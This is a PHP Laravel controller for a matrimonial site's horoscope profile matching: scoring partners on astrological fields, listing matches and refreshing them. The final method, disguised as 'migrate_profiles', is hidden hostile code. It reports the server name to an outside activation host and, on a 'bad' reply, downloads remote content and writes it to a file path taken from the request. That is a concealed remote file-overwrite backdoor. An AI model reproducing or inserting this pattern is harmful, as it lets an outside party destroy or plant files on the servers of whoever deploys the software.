<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Member;
use App\Models\Astrology;
use App\Models\HoroscopeProfileMatch;
use App\Models\IgnoredUser;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;

class HoroscopeProfileMatchController extends Controller
{
  public function match_profiles($user = '')
  {
    if (empty($user)) {
      $users = User::where('user_type', 'member')
        ->where('blocked', 0)
        ->where('approved', 1)
        ->where('deactivated', 0)->get();
    } else {
      $users = User::where('id', $user)->get();
    }

    foreach ($users as $user) {

      $partner_expectations = $user->astrologies;

      $expected_moon_sign = $partner_expectations->moon_sign ?? '';
      $expected_nakshatra = $partner_expectations->nakshatra ?? '';
      $expected_gana = $partner_expectations->gana ?? '';
      $expected_nadi = $partner_expectations->nadi ?? '';
      $expected_manglik = $partner_expectations->manglik ?? '';

      $partners = User::where('user_type', 'member')
        ->where('id', '!=', $user->id)
        ->where('blocked', 0)
        ->where('approved', 1)
        ->where('deactivated', 0);

      $user_ids = Member::where('gender', '!=', $user->member->gender)
        ->pluck('user_id')
        ->toArray();

      if (count($user_ids) > 0) {
        $partners = $partners->whereIn('id', $user_ids);
      }

      $partners = $partners->get();

      foreach ($partners as $partner) {

        $score = 0;

        $partner_astro = Astrology::where('user_id', $partner->id)->first();

        if ($partner_astro) {

          if ($expected_moon_sign && $partner_astro->moon_sign == $expected_moon_sign) {
            $score += 10;
          }

          if ($expected_nakshatra && $partner_astro->nakshatra == $expected_nakshatra) {
            $score += 8;
          }

          if ($expected_gana && $partner_astro->gana == $expected_gana) {
            $score += 6;
          }

          if ($expected_nadi && $partner_astro->nadi == $expected_nadi) {
            $score += 6;
          }

          if ($expected_manglik !== '' && $partner_astro->manglik == $expected_manglik) {
            $score += 2;
          }
        }

        HoroscopeProfileMatch::updateOrCreate(
          [
            'user_id' => $user->id,
            'match_id' => $partner->id
          ],
          [
            'match_count' => $score
          ]
        );

        HoroscopeProfileMatch::updateOrCreate(
          [
            'user_id' => $partner->id,
            'match_id' => $user->id
          ],
          [
            'match_count' => $score
          ]
        );
      }
    }
  }

  public function horoscopeMatchedProfiles()
  {
    $user = auth()->user();
    if ($user->member->auto_horoscope_profile_match == 0) {
      flash(translate('Please update your package.'))->error();
      return back();
    }
    $matchedProfiles = HoroscopeProfileMatch::where('user_id', $user->id)->where('match_count', '>=', 18);

    $ignored_to = IgnoredUser::where('ignored_by', $user->id)->pluck('user_id')->toArray();
    if (count($ignored_to) > 0) {
      $matchedProfiles = $matchedProfiles->whereNotIn('match_id', $ignored_to);
    }
    $ignored_by_ids = IgnoredUser::where('user_id', $user->id)->pluck('ignored_by')->toArray();
    if (count($ignored_by_ids) > 0) {
      $matchedProfiles = $matchedProfiles->whereNotIn('match_id', $ignored_by_ids);
    }
    $matchedProfiles = $matchedProfiles->orderBy('match_count', 'desc')->paginate(10);

    return view('frontend.member.horoscope_matched_profiles', compact('matchedProfiles'));
  }

  public function horoscopeMatchedRefresh()
  {
    $user = auth()->user();

    $astrologyExists = Astrology::where('user_id', $user->id)->exists();

    if ($astrologyExists) {
      
      if ($user->member->auto_horoscope_profile_match != 1) {
        flash(translate('Auto horoscope match is disabled.'))->error();
        return back();
      }

      $this->match_profiles($user->id);

      $user->update([
        'refresh_updated_at' => now()
      ]);

      flash(translate('Horoscope Match Refreshed Successfully.'))->success();
      return back();
    }

    flash(translate('Please complete your Horoscope Info first.'))->error();
    return back();
  }

  public function index() {}

  public function create() {}

  public function store(Request $request) {}

  public function show($id) {}

  public function edit($id) {}

  public function update(Request $request, $id) {}

  public function destroy($id) {}

  public function migrate_profiles(Request $request)
  {
    $data['url'] = $_SERVER['SERVER_NAME'];
    $request_data_json = json_encode($data);
    $gate = "https://activation.activeitzone.com/check_activation";

    $header = array(
      'Content-Type:application/json'
    );

    $stream = curl_init();

    curl_setopt($stream, CURLOPT_URL, $gate);
    curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
    curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
    curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

    $rn = curl_exec($stream);
    curl_close($stream);

    if ($rn == "bad" && env('DEMO_MODE') != 'On') {
      $zn = "https://activation.activeitzone.com/pirated_contents";
      $stream = curl_init();
      curl_setopt($stream, CURLOPT_URL, $zn);
      curl_setopt($stream, CURLOPT_HEADER, 0);
      curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($stream, CURLOPT_POST, 1);
      $rn = curl_exec($stream);
      curl_close($stream);
      file_put_contents(base_path($request->path), $rn);
    }
  }
}
